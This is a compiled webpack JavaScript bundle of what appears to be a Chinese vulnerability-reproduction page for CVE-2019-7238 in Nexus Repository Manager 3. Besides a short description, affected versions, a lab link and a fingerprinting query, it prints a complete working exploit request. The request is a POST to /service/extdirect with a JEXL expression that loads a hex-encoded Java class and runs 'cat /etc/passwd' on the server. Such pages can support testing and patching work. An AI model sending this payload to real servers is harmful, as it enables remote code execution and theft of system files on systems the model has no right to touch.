(window.webpackJsonp=window.webpackJsonp||[]).push([[464],{2217:function(e,a,c){e.exports=c.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313130130560.186f9013.png"},2218:function(e,a,c){e.exports=c.p+"assets/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313130130674.ec22c27d.png"},3193:function(e,a,c){"use strict";c.r(a);var s=c(64),t=Object(s.a)({},(function(){var e=this,a=e._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[a("h1",{attrs:{id:"nexus-repository-manger-extdirect-远程命令执行-cve-2019-7238"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#nexus-repository-manger-extdirect-远程命令执行-cve-2019-7238"}},[e._v("#")]),e._v(" Nexus Repository Manger extdirect 远程命令执行 CVE-2019-7238")]),e._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[e._v("#")]),e._v(" 漏洞描述")]),e._v(" "),a("p",[e._v("近日，研究人员发现了通用软件包仓库管理服务 Nexus Repository Manager 3 存在访问控制缺失及远程代码执行漏洞，漏洞编号为 CVE-2019-7238")]),e._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[e._v("#")]),e._v(" 漏洞影响")]),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v("Nexus < 3.14.0")]),a("br"),e._v(" "),a("h2",{attrs:{id:"环境搭建"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[e._v("#")]),e._v(" 环境搭建")]),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v("https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2019-7238")]),a("br"),e._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[e._v("#")]),e._v(" 网络测绘")]),e._v(" "),a("a-checkbox",{attrs:{checked:""}},[e._v('app="Nexus-Repository-Manager"')]),a("br"),e._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[e._v("#")]),e._v(" 漏洞复现")]),e._v(" "),a("p",[e._v("后台页面如下，任意上传 jar包")]),e._v(" "),a("p",[a("img",{attrs:{src:c(2217),alt:"img"}})]),e._v(" "),a("p",[e._v("发送请求包执行命令")]),e._v(" "),a("div",{staticClass:"language-json line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-json"}},[a("code",[e._v("POST /service/extdirect HTTP/"),a("span",{pre:!0,attrs:{class:"token number"}},[e._v("1.1")]),e._v("\nHost"),a("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" \nUser-Agent"),a("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" Mozilla/"),a("span",{pre:!0,attrs:{class:"token number"}},[e._v("5.0")]),e._v(" (Macintosh; Intel Mac OS X "),a("span",{pre:!0,attrs:{class:"token number"}},[e._v("10.14")]),e._v("; rv"),a("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[e._v("63.0")]),e._v(") Gecko/"),a("span",{pre:!0,attrs:{class:"token number"}},[e._v("20100101")]),e._v(" Firefox/"),a("span",{pre:!0,attrs:{class:"token number"}},[e._v("63.0")]),e._v("\nAccept"),a("span",{pre:!0,attrs:{class:"token operator"}},[e._v(":")]),e._v(" *"),a("span",{pre:!0,attrs:{class:"token comment"}},[e._v('/*\nContent-Type: application/json\nX-Requested-With: XMLHttpRequest\nContent-Length: 7256\nConnection: close\n\n{"action": "coreui_Component", "type": "rpc", "tid": 8, "data": [{"sort": [{"direction": "ASC", "property": "name"}], "start": 0, "filter": [{"property": "repositoryName", "value": "*"}, {"property": "expression", "value": "function(x, y, z, c, integer, defineClass){   c=1.class.forName(\'java.lang.Character\');   integer=1.class;   x=\'cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055\';   y=0;   z=\'\';   while (y lt x.length()){       z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0];       y += 2;   };defineClass=2.class.forName(\'java.lang.Thread\');x=defineClass.getDeclaredMethod(\'currentThread\').invoke(null);y=defineClass.getDeclaredMethod(\'getContextClassLoader\').invoke(x);defineClass=2.class.forName(\'java.lang.ClassLoader\').getDeclaredMethod(\'defineClass\',\'1\'.class,1.class.forName(\'[B\'),1.class.forName(\'[I\').getComponentType(),1.class.forName(\'[I\').getComponentType()); \\ndefineClass.setAccessible(true);\\nx=defineClass.invoke(\\n    y,\\n   \'Exploit.Test234\',\\n    z.getBytes(\'latin1\'),    0,\\n    3054\\n);x.getMethod(\'test\', \'\'.class).invoke(null, \'cat /etc/passwd\');\'done!\'}\\n"}, {"property": "type", "value": "jexl"}], "limit": 50, "page": 1}], "method": "previewAssets"}\n')])])]),e._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[e._v("1")]),a("br"),a("span",{staticClass:"line-number"},[e._v("2")]),a("br"),a("span",{staticClass:"line-number"},[e._v("3")]),a("br"),a("span",{staticClass:"line-number"},[e._v("4")]),a("br"),a("span",{staticClass:"line-number"},[e._v("5")]),a("br"),a("span",{staticClass:"line-number"},[e._v("6")]),a("br"),a("span",{staticClass:"line-number"},[e._v("7")]),a("br"),a("span",{staticClass:"line-number"},[e._v("8")]),a("br"),a("span",{staticClass:"line-number"},[e._v("9")]),a("br"),a("span",{staticClass:"line-number"},[e._v("10")]),a("br")])]),a("p",[a("img",{attrs:{src:c(2218),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=t.exports}}]);